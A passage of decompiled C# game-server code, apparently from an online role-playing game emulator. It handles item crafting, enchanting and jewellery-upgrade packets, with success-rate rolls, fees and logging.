												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass24.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass24.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass24.物品全局ID, 0))
												{
													减去物品(hcItimesClass24.位置, 1);
													增加物品(hcItimesClass24.物品全局ID, hcItimesClass24.物品id, hcItimesClass24.位置, hcItimesClass24.物品数量, hcItimesClass24.物品属性);
												}
												装备栏包裹[hcItimesClass24.位置].锁定 = false;
												合成物品表.Clear();
												合成系统解锁();
												元宝合成开关 = 0;
												合成手续费 = 0;
												打开仓库中 = false;
											}
											else
											{
												合成提示(21, 5, 0, 装备栏包裹[hcItimesClass24.位置]);
												合成物品表.Clear();
											}
										}
										else
										{
											合成提示(21, 5, 0, 装备栏包裹[hcItimesClass24.位置]);
											合成物品表.Clear();
										}
									}
								}
								return;
							}
							catch (Exception ex31)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex31.Message);
							}
							goto default;
						case 141:
							try
							{
								int num20 = 封包数据[14];
								if (装备栏包裹[num2].锁定)
								{
									合成提示(num, 3, 0, 装备栏包裹[num2]);
								}
								else if (装备栏包裹[num2].物品绑定)
								{
									合成提示(num, 3, 0, 装备栏包裹[num2]);
								}
								else if (装备栏包裹[num2].FLD_MAGIC1 != 0 && 装备栏包裹[num2].FLD_MAGIC2 != 0 && 装备栏包裹[num2].FLD_MAGIC3 != 0 && 装备栏包裹[num2].FLD_MAGIC4 != 0)
								{
									if (装备栏包裹[num20].Get物品ID != 1008000041L)
									{
										goto IL_96ee;
									}
									string a = 装备栏包裹[num2].FLD_MAGIC1.ToString().Substring(0, 1);
									string b = 装备栏包裹[num2].FLD_MAGIC2.ToString().Substring(0, 1);
									string b2 = 装备栏包裹[num2].FLD_MAGIC3.ToString().Substring(0, 1);
									string b3 = 装备栏包裹[num2].FLD_MAGIC4.ToString().Substring(0, 1);
									if (!(a != b) && !(a != b2) && !(a != b3))
									{
										goto IL_96ee;
									}
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
								else
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
								goto end_IL_9587;
								IL_97b0:
								ItmeClass value25;
								if (!合成物品表.ContainsKey(1))
								{
									合成手续费 = 计算合成强化费用(value25, num2, num);
									if (装备栏包裹[num20].Get物品ID == 1008001078L)
									{
										合成手续费 = 10000000;
									}
									HcItimesClass hcItimesClass21 = new HcItimesClass();
									hcItimesClass21.位置 = num2;
									hcItimesClass21.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(1, hcItimesClass21);
									合成提示(num, 1, 合成手续费, 装备栏包裹[num2]);
								}
								goto end_IL_9587;
								IL_96ee:
								if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value25))
								{
									if (装备栏包裹[num20].Get物品ID == 1008000041L)
									{
										if (value25.FLD_RESIDE2 != 4)
										{
											合成提示(num, 5, 0, 装备栏包裹[num2]);
										}
										else
										{
											if (value25.FLD_RESIDE1 == 8 || value25.FLD_RESIDE1 == 9)
											{
												goto IL_97b0;
											}
											合成提示(num, 5, 0, 装备栏包裹[num2]);
										}
									}
									else
									{
										if (装备栏包裹[num20].Get物品ID != 1008001078L || value25.FLD_RESIDE2 == 12)
										{
											goto IL_97b0;
										}
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
								}
								else
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
								end_IL_9587:;
							}
							catch (Exception ex29)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex29.Message);
							}
							goto default;
						case 142:
							try
							{
								if (合成物品表.Count == 0)
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
								else
								{
									int num19 = 封包数据[14];
									HcItimesClass hcItimesClass20 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass20 = 合成物品表[1];
									}
									ItmeClass value24;
									if (装备栏包裹[num19].Get物品ID == 1008000041L && 装备栏包裹[hcItimesClass20.位置].FLD_MAGIC1.ToString().Substring(0, 1) != 装备栏包裹[num2].FLD_MAGIC0.ToString().Substring(0, 1))
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
									else if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass20.物品id, 0), out value24))
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
									else if (装备栏包裹[num19].Get物品ID == 1008000041L)
									{
										if (装备栏包裹[num2].Get物品ID != 800000061L && 装备栏包裹[num2].Get物品ID != 800000023L && 装备栏包裹[num2].Get物品ID != 800000001L)
										{
											合成提示(num, 5, 0, 装备栏包裹[num2]);
										}
										else if (value24.FLD_LEVEL < 80)
										{
											if (装备栏包裹[num2].Get物品ID == 800000001L)
											{
												goto IL_9b5a;
											}
											合成提示(num, 5, 0, 装备栏包裹[num2]);
										}
										else if (value24.FLD_LEVEL >= 80 && value24.FLD_LEVEL < 130)
										{
											if (装备栏包裹[num2].Get物品ID == 800000001L || 装备栏包裹[num2].Get物品ID == 800000023L)
											{
												goto IL_9b5a;
											}
											合成提示(num, 5, 0, 装备栏包裹[num2]);
										}
										else
										{
											if (value24.FLD_LEVEL < 130 || 装备栏包裹[num2].Get物品ID == 800000061L)
											{
												goto IL_9b5a;
											}
											合成提示(num, 5, 0, 装备栏包裹[num2]);
										}
									}
									else if (装备栏包裹[num19].Get物品ID == 1008001078L)
									{
										if (装备栏包裹[num2].Get物品ID == 800000013L)
										{
											goto IL_9b5a;
										}
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
									else
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
								}
								goto end_IL_98ca;
								IL_9b5a:
								if (!合成物品表.ContainsKey(2))
								{
									合成物品表.Add(2, new HcItimesClass
									{
										位置 = num2,
										物品 = 装备栏包裹[num2].物品_byte
									});
									装备栏包裹[num2].锁定 = true;
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
								end_IL_98ca:;
							}
							catch (Exception ex28)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex28.Message);
							}
							goto default;
						case 143:
							try
							{
								if (合成物品表.Count == 0)
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
								else if (!合成物品表.ContainsKey(3))
								{
									合成物品表.Add(3, new HcItimesClass
									{
										位置 = num2,
										物品 = 装备栏包裹[num2].物品_byte
									});
									装备栏包裹[num2].锁定 = true;
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex26)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex26.Message);
							}
							goto default;
						case 148:
						case 149:
							try
							{
								HcItimesClass value23;
								if (合成物品表.TryGetValue(1, out value23))
								{
									装备栏包裹[value23.位置].锁定 = false;
									合成提示(num, 1, 0, 装备栏包裹[value23.位置]);
								}
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								打开仓库中 = false;
							}
							catch (Exception ex25)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex25.Message);
							}
							goto default;
						case 150:
							try
							{
								if (合成物品表.Count > 0)
								{
									HcItimesClass hcItimesClass12 = null;
									HcItimesClass hcItimesClass13 = null;
									HcItimesClass hcItimesClass14 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass12 = 合成物品表[1];
									}
									if (合成物品表.ContainsKey(2))
									{
										hcItimesClass13 = 合成物品表[2];
									}
									if (合成物品表.ContainsKey(3))
									{
										hcItimesClass14 = 合成物品表[3];
									}
									ItmeClass value14;
									if (BitConverter.ToInt64(装备栏包裹[hcItimesClass12.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass12.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass13.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass13.物品全局ID, 0) && (hcItimesClass14 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass14.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass14.物品全局ID, 0)) && World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass12.物品id, 0), out value14))
									{
										if (value14.FLD_RESIDE2 != 1 && value14.FLD_RESIDE2 != 4)
										{
											Form1.WriteLine(6, "合成系统 强化 BUG1[" + BitConverter.ToInt32(hcItimesClass12.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass13.物品id, 0) + "]");
										}
										else if (装备栏包裹[hcItimesClass12.位置].物品绑定)
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass12.位置]);
										}
										else
										{
											double num16 = RNG.Next(0, 100);
											double num17 = hcItimesClass12.FLD_FJ_觉醒 * 20;
											if (hcItimesClass12.FLD_FJ_觉醒 >= 5)
											{
												合成物品表.Clear();
												合成提示(num, 6, 0, 装备栏包裹[num2]);
												合成系统解锁();
												元宝合成开关 = 0;
											}
											else
											{
												if (hcItimesClass14 != null)
												{
													num16 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass14.物品id, 0));
												}
												if (元宝合成开关 == 1)
												{
													num16 += 5.0;
												}
												if (base.FLD_VIP == 1)
												{
													num16 += World.VIP合成率增加百分比;
												}
												if (World.附魂率 != 0.0)
												{
													num16 += 100.0 * World.附魂率;
												}
												if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
												{
													num16 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
												}
												if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
												{
													num16 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
												}
												if (GM模式 == 8)
												{
													num17 = 0.0;
												}
												if (num16 >= num17)
												{
													int num9 = ++hcItimesClass12.FLD_FJ_觉醒;
													合成提示(num, 1, 0, 装备栏包裹[hcItimesClass12.位置]);
													RxjhClass.合成记录(base.Userid, base.UserName, value14.ItmeNAME, num, "附魂", "成功", 装备栏包裹[hcItimesClass12.位置]);
												}
												else
												{
													RxjhClass.合成记录(base.Userid, base.UserName, value14.ItmeNAME, num, "附魂", "失败", 装备栏包裹[hcItimesClass12.位置]);
													合成提示(num, 0, 0, 装备栏包裹[hcItimesClass12.位置]);
												}
												减去物品(hcItimesClass13.位置, 1);
												if (hcItimesClass14 != null)
												{
													减去物品(hcItimesClass14.位置, 1);
												}
												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass12.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass12.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass12.物品全局ID, 0))
												{
													减去物品(hcItimesClass12.位置, 1);
													增加物品(hcItimesClass12.物品全局ID, hcItimesClass12.物品id, hcItimesClass12.位置, hcItimesClass12.物品数量, hcItimesClass12.物品属性);
												}
												装备栏包裹[hcItimesClass12.位置].锁定 = false;
												合成物品表.Clear();
												合成系统解锁();
												元宝合成开关 = 0;
												打开仓库中 = false;
											}
										}
									}
								}
							}
							catch (Exception ex19)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex19.Message);
							}
							goto default;
						case 151:
							try
							{
								if (base.当前操作类型 == 122 && 合成物品表.Count != 0 && 合成物品表.ContainsKey(2) && !合成物品表.ContainsKey(1) && !装备栏包裹[num2].物品绑定)
								{
									if (装备栏包裹[num2].FLD_FJ_觉醒 >= 5)
									{
										合成物品表.Clear();
										合成系统解锁();
										元宝合成开关 = 0;
										打开仓库中 = false;
										合成提示(num, 6, 0, 装备栏包裹[num2]);
									}
									else
									{
										HcItimesClass hcItimesClass11 = new HcItimesClass();
										hcItimesClass11.位置 = num2;
										hcItimesClass11.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(1, hcItimesClass11);
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex18)
							{
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex18.Message);
							}
							goto default;
						case 152:
							try
							{
								if (base.当前操作类型 == 122)
								{
									if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 1000000365 && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 1000000367)
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
									else
									{
										if (合成物品表.Count != 0)
										{
											合成物品表.Clear();
										}
										if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 1000000365 || BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 1000000367)
										{
											HcItimesClass hcItimesClass33 = new HcItimesClass();
											hcItimesClass33.位置 = num2;
											hcItimesClass33.物品 = 装备栏包裹[num2].物品_byte;
											装备栏包裹[num2].锁定 = true;
											合成物品表.Add(2, hcItimesClass33);
											打开仓库中 = true;
											合成提示(num, 1, 0, 装备栏包裹[num2]);
										}
									}
								}
							}
							catch (Exception ex33)
							{
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex33.Message);
							}
							goto default;
						case 153:
							try
							{
								if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
								{
									HcItimesClass hcItimesClass19 = new HcItimesClass();
									hcItimesClass19.位置 = num2;
									hcItimesClass19.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(3, hcItimesClass19);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex27)
							{
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex27.Message);
							}
							goto default;
						case 159:
							try
							{
								HcItimesClass value13;
								if (合成物品表.TryGetValue(1, out value13))
								{
									装备栏包裹[value13.位置].锁定 = false;
									合成提示(num, 1, 0, 装备栏包裹[value13.位置]);
								}
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								打开仓库中 = false;
							}
							catch (Exception ex16)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex16.Message);
							}
							goto default;
						case 170:
							try
							{
								if (合成物品表.Count > 0)
								{
									HcItimesClass hcItimesClass130 = null;
									if (合成物品表.ContainsKey(1))
									{
										HcItimesClass hcItimesClass131 = 合成物品表[1];
										if (合成物品表.ContainsKey(2))
										{
											HcItimesClass hcItimesClass132 = 合成物品表[2];
											if (合成物品表.ContainsKey(3))
											{
												hcItimesClass130 = 合成物品表[3];
											}
											if (合成物品表.ContainsKey(4))
											{
												HcItimesClass hcItimesClass133 = 合成物品表[4];
												ItmeClass value103;
												if (BitConverter.ToInt64(装备栏包裹[hcItimesClass131.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass131.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass132.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass132.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass133.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass133.物品全局ID, 0) && (hcItimesClass130 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass130.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass130.物品全局ID, 0)) && World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass131.物品id, 0), out value103))
												{
													if (value103.FLD_RESIDE2 != 1 && value103.FLD_RESIDE2 != 4)
													{
														Form1.WriteLine(6, "合成系统 中级附魂 BUG1[" + BitConverter.ToInt32(hcItimesClass131.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass132.物品id, 0) + "]");
													}
													else if (value103.FLD_LEVEL >= 80)
													{
														if (装备栏包裹[hcItimesClass131.位置].物品绑定)
														{
															合成提示(num, 2, 0, 装备栏包裹[hcItimesClass131.位置]);
														}
														else
														{
															hcItimesClass132.强化属性阶段();
															double num81 = RNG.Next(80, 181);
															double num82 = hcItimesClass131.FLD_FJ_觉醒 * 20;
															if (hcItimesClass130 != null)
															{
																num81 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass130.物品id, 0));
															}
															if (元宝合成开关 == 1)
															{
																num81 += 5.0;
															}
															if (base.FLD_VIP == 1)
															{
																num81 += 100.0 * World.VIP合成率增加百分比;
															}
															if (World.合成率 != 0.0)
															{
																num81 += 100.0 * World.合成率;
															}
															if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
															{
																num81 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
															}
															if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
															{
																num81 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
															}
															if (num81 >= num82)
															{
																hcItimesClass131.FLD_FJ_中级附魂 = hcItimesClass132.阶段数量;
																减去物品(hcItimesClass131.位置, 1);
																增加物品(hcItimesClass131.物品全局ID, hcItimesClass131.物品id, hcItimesClass131.位置, hcItimesClass131.物品数量, hcItimesClass131.物品属性);
																if (hcItimesClass132 != null)
																{
																	减去物品(hcItimesClass132.位置, 1);
																}
																if (hcItimesClass133 != null)
																{
																	减去物品(hcItimesClass133.位置, 1);
																}
																if (hcItimesClass130 != null)
																{
																	减去物品(hcItimesClass130.位置, 1);
																}
																装备栏包裹[hcItimesClass131.位置].锁定 = false;
																合成物品表.Clear();
																合成系统解锁();
																元宝合成开关 = 0;
																RxjhClass.合成记录(base.Userid, base.UserName, value103.ItmeNAME, num, "中级附魂", "成功", 装备栏包裹[hcItimesClass131.位置]);
																合成提示(num, 1, 0, 装备栏包裹[num2]);
															}
															else
															{
																if (hcItimesClass132 != null)
																{
																	减去物品(hcItimesClass132.位置, 1);
																}
																if (hcItimesClass133 != null)
																{
																	减去物品(hcItimesClass133.位置, 1);
																}
																if (hcItimesClass130 != null)
																{
																	减去物品(hcItimesClass130.位置, 1);
																}
																装备栏包裹[hcItimesClass131.位置].锁定 = false;
																合成物品表.Clear();
																合成系统解锁();
																元宝合成开关 = 0;
																RxjhClass.合成记录(base.Userid, base.UserName, value103.ItmeNAME, num, "中级附魂", "失败", 装备栏包裹[hcItimesClass131.位置]);
																合成提示(num, 0, 0, 装备栏包裹[num2]);
															}
														}
													}
												}
											}
										}
									}
								}
							}
							catch (Exception ex102)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 中级附魂 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex102.Message);
							}
							goto default;
						case 171:
							try
							{
								ItmeClass value6;
								if (合成物品表.Count != 0 && 合成物品表.ContainsKey(4) && !合成物品表.ContainsKey(1) && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value6) && (value6.FLD_RESIDE2 == 1 || value6.FLD_RESIDE2 == 4) && value6.FLD_LEVEL >= 80)
								{
									HcItimesClass hcItimesClass6 = new HcItimesClass();
									hcItimesClass6.位置 = num2;
									hcItimesClass6.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(1, hcItimesClass6);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex9)
							{
								Form1.WriteLine(1, "合成系统 中级附魂 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex9.Message);
							}
							goto default;
						case 172:
							try
							{
								HcItimesClass hcItimesClass120;
								if (合成物品表.Count != 0 && !合成物品表.ContainsKey(2))
								{
									hcItimesClass120 = new HcItimesClass();
									hcItimesClass120.位置 = num2;
									hcItimesClass120.物品 = 装备栏包裹[num2].物品_byte;
									hcItimesClass120.强化属性阶段();
									if (合成物品表.ContainsKey(1))
									{
										HcItimesClass hcItimesClass121 = 合成物品表[1];
										ItmeClass value99;
										if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass121.物品id, 0), out value99))
										{
											goto IL_ae20;
										}
										if (value99.FLD_RESIDE2 == 4)
										{
											if (value99.FLD_LEVEL >= 80)
											{
												goto IL_ae20;
											}
											合成提示(num, 2, 0, 装备栏包裹[num2]);
											合成物品表.Remove(1);
										}
										else
										{
											if (value99.FLD_RESIDE2 != 1 || value99.FLD_LEVEL >= 80)
											{
												goto IL_ae20;
											}
											合成提示(num, 3, 0, 装备栏包裹[num2]);
											合成物品表.Remove(1);
										}
									}
								}
								goto end_IL_ad13;
								IL_ae20:
								装备栏包裹[num2].锁定 = true;
								合成物品表.Add(2, hcItimesClass120);
								合成提示(num, 1, 0, 装备栏包裹[num2]);
								end_IL_ad13:;
							}
							catch (Exception ex95)
							{
								Form1.WriteLine(1, "合成系统 中级附魂 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex95.Message);
							}
							goto default;
						case 173:
							try
							{
								if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
								{
									HcItimesClass hcItimesClass122 = new HcItimesClass();
									hcItimesClass122.位置 = num2;
									hcItimesClass122.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(3, hcItimesClass122);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex96)
							{
								Form1.WriteLine(1, "合成系统 中级附魂 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex96.Message);
							}
							goto default;
						case 174:
							try
							{
								if (!合成物品表.ContainsKey(4) && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 1000000330)
								{
									HcItimesClass hcItimesClass125 = new HcItimesClass();
									hcItimesClass125.位置 = num2;
									hcItimesClass125.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(4, hcItimesClass125);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex100)
							{
								Form1.WriteLine(1, "合成系统 中级附魂 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex100.Message);
							}
							goto default;
						case 179:
							try
							{
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								打开仓库中 = false;
								合成提示(num, 1, 0, 装备栏包裹[num2]);
							}
							catch (Exception ex99)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex99.Message);
							}
							goto default;
						case 180:
							if (合成物品表.Count > 0 && 合成物品表.ContainsKey(1))
							{
								HcItimesClass hcItimesClass22 = null;
								HcItimesClass hcItimesClass23 = null;
								if (合成物品表.ContainsKey(1))
								{
									hcItimesClass22 = 合成物品表[1];
								}
								if (合成物品表.ContainsKey(2))
								{
									hcItimesClass23 = 合成物品表[2];
								}
								if (BitConverter.ToInt64(装备栏包裹[hcItimesClass22.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass22.物品全局ID, 0) && (hcItimesClass23 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass23.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass23.物品全局ID, 0)))
								{
									ItmeClass value26;
									if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass22.物品id, 0), out value26))
									{
										if (value26.FLD_RESIDE2 != 7 && value26.FLD_RESIDE2 != 8 && value26.FLD_RESIDE2 != 10)
										{
											合成提示(num, 19, 0, 装备栏包裹[hcItimesClass22.位置]);
											合成物品表.Clear();
										}
										else if (value26.FLD_UP_LEVEL == 0)
										{
											合成提示(num, 19, 0, 装备栏包裹[num2]);
											合成物品表.Clear();
										}
										else if (value26.FLD_PID != 100026 && (value26.FLD_PID != 18 || value26.FLD_PID != 700911))
										{
											if (base.Player_Money < 10000000L)
											{
												合成提示(11, 4, 10000000, 装备栏包裹[hcItimesClass22.位置]);
												合成物品表.Clear();
											}
											else
											{
												base.Player_Money -= 10000000L;
												更新金钱和负重();
												double num21 = RNG.Next(0, 101 + value26.FLD_LEVEL * 2);
												double num22 = 0.0;
												if (hcItimesClass23 != null)
												{
													num22 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass23.物品id, 0));
												}
												if (元宝合成开关 == 1)
												{
													num22 += 5.0;
												}
												if (base.FLD_VIP == 1)
												{
													num22 += 100.0 * World.VIP合成率增加百分比;
												}
												if (World.首饰升级率 != 0.0)
												{
													num22 += 100.0 * World.首饰升级率;
												}
												if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
												{
													num22 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
												}
												if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
												{
													num22 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
												}
												byte[] 物品id = hcItimesClass22.物品id;
												if (num22 >= num21)
												{
													int num23 = 首饰升级取首饰(value26.FLD_RESIDE2, value26.FLD_PID, 0);
													if (num23 == 0)
													{
														合成提示(num, 19, 合成手续费, 装备栏包裹[hcItimesClass22.位置]);
														RxjhClass.合成记录(base.Userid, base.UserName, value26.ItmeNAME, num, "首饰升级", "失败", 装备栏包裹[hcItimesClass22.位置]);
														合成物品表.Clear();
														goto default;
													}
													byte[] bytes = BitConverter.GetBytes(num23);
													if (BitConverter.ToInt32(装备栏包裹[hcItimesClass22.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass22.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass22.物品全局ID, 0))
													{
														减去物品(hcItimesClass22.位置, 1);
														ItmeClass value27;
														if (World.Itme.TryGetValue(num23, out value27))
														{
															byte[] array5 = new byte[World.物品属性大小];
															System.Buffer.BlockCopy(hcItimesClass22.物品属性, 0, array5, 0, World.物品属性大小);
															System.Buffer.BlockCopy(BitConverter.GetBytes(value27.FLD_MAGIC1), 0, array5, 4, 4);
															System.Buffer.BlockCopy(BitConverter.GetBytes(value27.FLD_MAGIC2), 0, array5, 8, 4);
															System.Buffer.BlockCopy(BitConverter.GetBytes(value27.FLD_MAGIC3), 0, array5, 12, 4);
															System.Buffer.BlockCopy(BitConverter.GetBytes(value27.FLD_MAGIC4), 0, array5, 16, 4);
															增加物品(hcItimesClass22.物品全局ID, bytes, hcItimesClass22.位置, hcItimesClass22.物品数量, array5);
														}
													}
													if (hcItimesClass23 != null)
													{
														减去物品(hcItimesClass23.位置, 1);
													}
													RxjhClass.合成记录(base.Userid, base.UserName, value26.ItmeNAME, num, "首饰升级", "成功", 装备栏包裹[hcItimesClass22.位置]);
													合成提示(num, 11, 合成手续费, 装备栏包裹[hcItimesClass22.位置]);
												}
												else
												{
													int num24 = 首饰升级取首饰(value26.FLD_RESIDE2, value26.FLD_PID, 1);
													if (num24 != 0)
													{
														double num25 = RNG.Next(0, 100);
														byte[] bytes2 = BitConverter.GetBytes(num24);
														if (num25 >= 0.0 && num25 < 10.0)
														{
															if (BitConverter.ToInt32(装备栏包裹[hcItimesClass22.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass22.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass22.物品全局ID, 0))
															{
																减去物品(hcItimesClass22.位置, 1);
																ItmeClass value28;
																if (World.Itme.TryGetValue(num24, out value28))
																{
																	byte[] array6 = new byte[World.物品属性大小];
																	System.Buffer.BlockCopy(hcItimesClass22.物品属性, 0, array6, 0, World.物品属性大小);
																	System.Buffer.BlockCopy(BitConverter.GetBytes(value28.FLD_MAGIC1), 0, array6, 4, 4);
																	System.Buffer.BlockCopy(BitConverter.GetBytes(value28.FLD_MAGIC2), 0, array6, 8, 4);
																	System.Buffer.BlockCopy(BitConverter.GetBytes(value28.FLD_MAGIC3), 0, array6, 12, 4);
																	System.Buffer.BlockCopy(BitConverter.GetBytes(value28.FLD_MAGIC4), 0, array6, 16, 4);
																	增加物品(hcItimesClass22.物品全局ID, bytes2, hcItimesClass22.位置, hcItimesClass22.物品数量, array6);
																}
															}
														}
														else
														{
															减去物品(hcItimesClass22.位置, 1);
														}
													}
													else
													{
														减去物品(hcItimesClass22.位置, 1);
													}
													if (hcItimesClass23 != null)
													{
														减去物品(hcItimesClass23.位置, 1);
													}
													合成提示(num, 10, 合成手续费, 装备栏包裹[hcItimesClass22.位置]);
												}
												装备栏包裹[hcItimesClass22.位置].锁定 = false;
												合成物品表.Clear();
												合成系统解锁();
												元宝合成开关 = 0;
												合成手续费 = 0;
											}
										}
										else
										{
											合成提示(num, 19, 0, 装备栏包裹[num2]);
											合成物品表.Clear();
										}
									}
									else
									{
										合成提示(num, 19, 0, 装备栏包裹[hcItimesClass22.位置]);
										合成物品表.Clear();
									}
								}
							}
							goto default;
						case 181:
							if (合成物品表.Count > 0 && 合成物品表.ContainsKey(1))
							{
								hcItimesClass32 = null;
								HcItimesClass hcItimesClass68 = null;
								if (合成物品表.ContainsKey(1))
								{
									hcItimesClass32 = 合成物品表[1];
								}
								if (合成物品表.ContainsKey(2))
								{
									hcItimesClass68 = 合成物品表[2];
								}
								if (BitConverter.ToInt64(装备栏包裹[hcItimesClass32.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass32.物品全局ID, 0) && (hcItimesClass68 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass68.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass68.物品全局ID, 0)))
								{
									ItmeClass value62;
									if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass32.物品id, 0), out value62))
									{
